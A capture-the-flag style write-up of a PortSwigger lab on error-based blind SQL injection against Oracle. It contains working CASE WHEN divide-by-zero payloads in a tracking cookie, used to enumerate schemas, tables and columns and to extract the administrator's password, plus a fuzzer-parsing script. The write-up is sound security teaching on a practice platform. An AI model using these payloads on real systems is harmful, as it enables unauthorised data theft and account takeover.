# Blind SQL Injection with Conditional Errors

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

To solve the lab, log in as the administrator user.

---

## Lab

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

---

## OWASP Category

A03:2021 – Injection

---

## Steps to Solve

---

**Step 1 — Searching the SQLi Type**

We can't inject payload directly without knowing the actual type of SQLi. So we need to know which type of SQLi we can perform here.

First we try to find a parameter we can inject a query into. After some [**Information Gathering**](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/README) we found that the application stores cookies and its **TrackingId** is where we can inject our payload.

<!-- Screenshot: Show the TrackingId cookie in ZAP request editor -->

Then we try a UNION-based query and conditional response payloads, but there is no visible change in the application response regardless of whether the condition is true or false. You can refer to previous [**labs**](https://github.com/s1v7m81/Portswigger-Writeups_WebSec/tree/main/Portswigger_Web-Sec/SQL-Injection) for that.

This means the application does not behave differently based on query results — so the previous conditional response technique does not work here.

However, we notice that the application **does** behave differently when a **database error** occurs. This confirms this is **Conditional Error-Based Blind SQLi**.

The key idea is: we craft a query that causes a **divide-by-zero error only when the condition is true**. If the application throws an error response — the condition was true. If the response is normal — the condition was false.

We test this with the `CASE` expression:

```http
abc' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
abc' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
```

Here **abc** is the assumed value of **TrackingId** in the request. Note that Oracle requires `FROM dual` in every `SELECT` statement — `dual` is Oracle's built-in dummy table used when no real table is needed.

- First query: `1=2` is false → evaluates to `'a'` → **no error** → normal response
- Second query: `1=1` is true → evaluates to `TO_CHAR(1/0)` → **divide-by-zero error** → error response

We observe that if the condition is **true** → application returns a **500 error response**. If the condition is **false** → application returns a **normal 200 response**.

For all this we use [**OWASP ZAP**](https://www.zaproxy.org/download/). For usage of OWASP ZAP you can refer to this [**Guide**](https://www.zaproxy.org/docs/).

Now let's inject some queries related to error-based blind SQLi to retrieve data.

---

**Step 2 — Inject Payload**

First we check which database the web app is using. We use error-triggering syntax specific to each database:

PostgreSQL:
```http
abc' AND (SELECT CASE WHEN (1=1) THEN CAST(1/0 AS TEXT) ELSE 'a' END)='a'--
```

Oracle:
```http
abc' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
```

MySQL:
```http
abc' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'--
```

MSSQL:
```http
abc' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'--
```

We get a **500 error response** with the Oracle-style `TO_CHAR(1/0) FROM dual` query. This confirms the database is **Oracle**.

<img width="363" height="115" alt="image" src="https://github.com/user-attachments/assets/89dec90e-309a-4a15-ae56-43d2d3bb4db1" />

Now we try to discover the number of columns in the database:

```http
' ORDER BY 1--
' ORDER BY 2--
```

After `' ORDER BY 2--` we get an error response. So we confirmed that the database has **one column only**.

In **Conditional Error-Based Blind SQLi** we determine information from whether the application returns an **error (500)** or **normal (200)** response — if it errors, the condition was true and the query is correct.

---

**Step 3 — Retrieve Data**

For retrieving data we use the `CASE WHEN` expression to trigger a divide-by-zero error when the condition we are testing is true. We check the **metadata about the DATABASE** with Oracle queries.

The base structure of all queries in this technique is:

```http
' AND (SELECT CASE WHEN (<condition>) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
```

- If **condition is true** → `TO_CHAR(1/0)` executes → **500 error**
- If **condition is false** → returns `'a'` → **200 normal**

> **Oracle Note:** Unlike PostgreSQL or MySQL, every Oracle `SELECT` must include a `FROM` clause. We use `FROM dual` throughout — `dual` is a special one-row, one-column dummy table built into Oracle, perfect for queries that don't need a real table.

We use the **Fuzzer** for iteration. We set different payload parameters in the fuzzer — the position number uses `Numberzz` type with range 1 to 20, and the character guess uses a file containing all lowercase alphabets and special characters like `_`, `-`, `@`.

In the fuzzer results we identify correct characters by looking at the **response code** column — responses with **500** are the correct characters.

---

**1. SCHEMATA (Oracle: ALL_USERS / DBA_USERS)**

> **Oracle Note:** Oracle does not use `INFORMATION_SCHEMA.SCHEMATA` like PostgreSQL/MySQL. Instead, schemas are equivalent to **users/owners**. We query `ALL_USERS` to list accessible schemas, using `ROWNUM` for pagination (Oracle has no `LIMIT`/`OFFSET`).

Oracle pagination pattern:
```sql
SELECT username FROM (
  SELECT username, ROWNUM AS rn FROM ALL_USERS
) WHERE rn = 1
```

Query for row 1 (equivalent to OFFSET 0):
```http
' AND (SELECT CASE WHEN (SUBSTR((SELECT username FROM (SELECT username, ROWNUM AS rn FROM ALL_USERS) WHERE rn=1),1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
```

Let's FUZZ!

After fuzzing we look for responses with **500 status code** — those are the correct characters.

Schema/User found: **XSNULL** for row 1.

<img width="1907" height="355" alt="image" src="https://github.com/user-attachments/assets/1d78de34-efb1-402c-bac6-66b492ac64b6" />

Now let's change `rn=2` to find the next schema:

```http
' AND (SELECT CASE WHEN (SUBSTR((SELECT username FROM (SELECT username, ROWNUM AS rn FROM ALL_USERS) WHERE rn=2),1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
```

Schema found: **PETER** for row 2 (That is likely **OWNER** name)

<img width="1892" height="373" alt="image" src="https://github.com/user-attachments/assets/80c9c29e-bc84-4d5e-b2fd-133a0ef08ee6" />

Now let's change `rn=3` to find the next schema:

```http
' AND (SELECT CASE WHEN (SUBSTR((SELECT username FROM (SELECT username, ROWNUM AS rn FROM ALL_USERS) WHERE rn=3),1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
```

Continue incrementing `rn` until **if** you not find an interesting user/schema. Look for application-specific owners (not SYS/SYSTEM/built-ins).

---

**2. TABLES (Oracle: ALL_TABLES)**

> **Oracle Note:** Use `ALL_TABLES` with `OWNER` filter instead of `information_schema.tables` with `table_schema`. Replace the owner name `PETER` with the application schema found above.

Query for row 1 (first table under target owner):
```http
' AND (SELECT CASE WHEN (SUBSTR((SELECT table_name FROM (SELECT table_name, ROWNUM AS rn FROM ALL_TABLES WHERE OWNER='PETER') WHERE rn=1),1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
```

Let's fuzz this!

Table found: **USERS** for row 1.

<img width="1872" height="355" alt="image" src="https://github.com/user-attachments/assets/78786555-cfab-41a2-b52f-e10195591585" />

Now let's change `rn=2` to find the next table:

```http
' AND (SELECT CASE WHEN (SUBSTR((SELECT table_name FROM (SELECT table_name, ROWNUM AS rn FROM ALL_TABLES WHERE OWNER='PETER') WHERE rn=2),1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
```

Table found: **TRACKING** for row 2

<img width="1880" height="324" alt="image" src="https://github.com/user-attachments/assets/c7eb8026-7c3f-472a-8239-bb41070279e8" />

After that with `rn=3` we found nothing. We have one table named **USERS** which is likely sensitive.

---

**3. COLUMNS (Oracle: ALL_TAB_COLUMNS)**

> **Oracle Note:** Use `ALL_TAB_COLUMNS` instead of `information_schema.columns`. Table names in Oracle are stored in **UPPERCASE** by default.

Query for row 1 (first column in USERS table):
```http
' AND (SELECT CASE WHEN (SUBSTR((SELECT column_name FROM (SELECT column_name, ROWNUM AS rn FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS') WHERE rn=1),1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
```

Column name found: **USERNAME** for row 1

<img width="1898" height="328" alt="image" src="https://github.com/user-attachments/assets/52032021-77d6-48cd-bd7e-e9d9fa70131f" />

Now let's change `rn=2` to find the next column:

```http
' AND (SELECT CASE WHEN (SUBSTR((SELECT column_name FROM (SELECT column_name, ROWNUM AS rn FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS') WHERE rn=2),1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
```

Column name found: **PASSWORD** for row 2

<img width="1920" height="360" alt="image" src="https://github.com/user-attachments/assets/88baa02d-c183-4fc8-a383-34f71235cb91" />

Now let's change `rn=3` to find the next column:

```http
' AND (SELECT CASE WHEN (SUBSTR((SELECT column_name FROM (SELECT column_name, ROWNUM AS rn FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='USERS') WHERE rn=3),1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
```

Column name found: **EMAIL** for row 3

<img width="1901" height="321" alt="image" src="https://github.com/user-attachments/assets/f67e9407-c237-4096-b9e5-686c7e3e3818" />

We found two sensitive columns — **USERNAME** and **PASSWORD**.

---

**4. Final Data Extraction**

Now we extract the actual data from the **USERS** table.

> **Oracle Note:** Use `SUBSTR` instead of PostgreSQL's `SUBSTRING`. Syntax is `SUBSTR(string, start_position, length)` — identical behavior, different function name.

Query for username at row 1:
```http
' AND (SELECT CASE WHEN (SUBSTR((SELECT username FROM (SELECT username, ROWNUM AS rn FROM users) WHERE rn=1),1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
```

Username found: **administrator** — our targeted user.

<img width="1920" height="418" alt="image" src="https://github.com/user-attachments/assets/fa3e83ae-cfb0-4e6e-be14-0a49cdeafac9" />

Now we extract the password of **administrator** using the same row but targeting the password column:

```http
' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM (SELECT password, ROWNUM AS rn FROM users WHERE username='administrator') WHERE rn=1),1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
```

Final password found: **8scpe4mtzqvmq43o2rny**

<img width="1903" height="565" alt="image" src="https://github.com/user-attachments/assets/03343b08-c100-4fcb-9f34-ef4db5a5763c" />

---

**Lab Solved**

<img width="1590" height="653" alt="image" src="https://github.com/user-attachments/assets/80416e17-deb5-4329-9e73-0d0dd3ee4432" />

---

## Oracle vs PostgreSQL/MySQL — Key Syntax Differences

| Feature | Oracle | PostgreSQL | MySQL/MSSQL |
|--|--|--|--|
| Dummy table | `FROM dual` (required) | No `FROM` needed | No `FROM` needed |
| String substring | `SUBSTR(str, pos, len)` | `SUBSTRING(str, pos, len)` | `SUBSTRING(str, pos, len)` |
| Divide-by-zero trigger | `TO_CHAR(1/0)` | `CAST(1/0 AS TEXT)` | `1/0` |
| Pagination | `ROWNUM` with subquery | `LIMIT n OFFSET m` | `LIMIT n OFFSET m` |
| Schema catalog | `ALL_USERS` | `INFORMATION_SCHEMA.SCHEMATA` | `INFORMATION_SCHEMA.SCHEMATA` |
| Table catalog | `ALL_TABLES` | `information_schema.tables` | `information_schema.tables` |
| Column catalog | `ALL_TAB_COLUMNS` | `information_schema.columns` | `information_schema.columns` |
| Table names case | UPPERCASE by default | lowercase | lowercase |
| Comment style | `--` | `--` | `--` or `#` |

---

## Difference from Conditional Response Lab

| | Conditional Response | Conditional Error |
|--|--|--|
| True condition shows | Welcome back! message | 500 error response |
| False condition shows | No welcome message | 200 normal response |
| Identify correct char by | Response body size | Response status code |
| Technique used | `AND '1'='1` | `CASE WHEN ... THEN TO_CHAR(1/0)` |

---

## Bonus Code

We can use a **Python script** to retrieve the password from the `.csv` file exported from the ZAP Fuzzer. In this lab we filter by **response code 500** instead of response size.

```python
import csv

codes = set()
with open('Untitled.csv', 'r') as f:
    for row in csv.DictReader(f):
        codes.add(row['Code'])
print("Response codes found:", sorted(codes))

results = {}
with open('Untitled.csv', 'r') as f:
    for row in csv.DictReader(f):
        if row['Code'] == '500':
            p = row['Payloads'].strip('[]"').split(', ')
            results[int(p[0])] = p[1].strip('"')

print("Found:", ''.join(results[k] for k in sorted(results)))
```

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
